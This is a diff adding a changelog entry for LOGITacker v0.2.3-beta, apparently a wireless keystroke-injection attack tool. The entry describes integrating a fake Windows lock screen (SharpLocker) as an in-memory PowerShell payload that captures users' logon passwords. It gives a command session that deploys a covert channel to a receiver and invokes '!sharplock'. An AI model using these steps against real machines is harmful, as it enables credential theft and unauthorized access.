@@ -1,3 +1,66 @@
+# LOGITacker v0.2.3-beta
+
+- added R400 presentation clicker support for covert channel
+- integrated customized version of SharpLocker
+
+[SharpLocker by Matt Pickford](https://github.com/Pickfordmatt/SharpLocker) is a fake Windows 10 LockScreen,
+which tries to steal logon user credentials.
+
+LOGITacker incorporates a heavily modified and size reduced PowerShell version of [SharpLocker (not much left
+of the original code](https://github.com/mame82/SharpLocker/tree/netassembly) according to github `488 additions and 354 
+deletions`). 
+
+What has been kept are the limitations:
+
+- Windows 10 only
+- targets 1080p resolution for main screen
+- **This version was only tested on two Win 10 boxes - so it is experimental**
+
+Improvements over legacy Version
+
+- 80 KB exe (PE-File) was converted to self-contained 15KB PowerShell payload, which could run entirely in memory
+- does not quit the UI thread of the embedding process
+- tries to display the user's real LockScreen background
+- tries to display the user's real profile picture
+- the exposed NET method (a NET class library is embedded), returns the user password input as `string` object,
+which allows further processing in PowerShell if the payload is modified accordingly
+
+## LOGITacker SharpLocker integration / HowTo
+
+SharpLocker could be invoked from a already deployed covert channel (requires knowledge of the address of an 
+injectable receiver - either because it accepts plain keystrokes or because the encryption key is known/was sniffed).
+
+From inside the covert channel shell, SharpLock could be invoked by entering `!sharplock`!
+
+Assuming the injectable receiver address is `E2:C7:94:F2:3C` a session looks like this:
+
+```
+LOGITacker (discover) $ covert_channel deploy E2:C7:94:F2:3C
+... snip ...
+
+LOGITacker (injection) $ covert_channel connnect E2:C7:94:F2:3C 
+Starting covert channel for device E2:C7:94:F2:3C
+enter '!exit' to return to normal CLI mode
+
+...snip...
+s [Version 10.0.18363.535]
+(c) 2019 Microsoft Corporation. Alle Rechte vorbehalten.
+
+C:\Users\X770>!sharplock
+
+... snip (typed out powershell code) ...
+
+SharpLocker input: notMyRealPassword
+
+C:\Users\X770>
+```
+
+**For updates from older LOGITacker versions the command `erase_flash` has to be ran once, to re-initialize
+the flash data storage for the changed data structures. Not doing so likely causes errors during LOGITacker 
+operation**
+
+
+
 # LOGITacker v0.2.2-beta
 
 **For updates from older LOGITacker versions the command `erase_flash` has to be ran once, to re-initialize
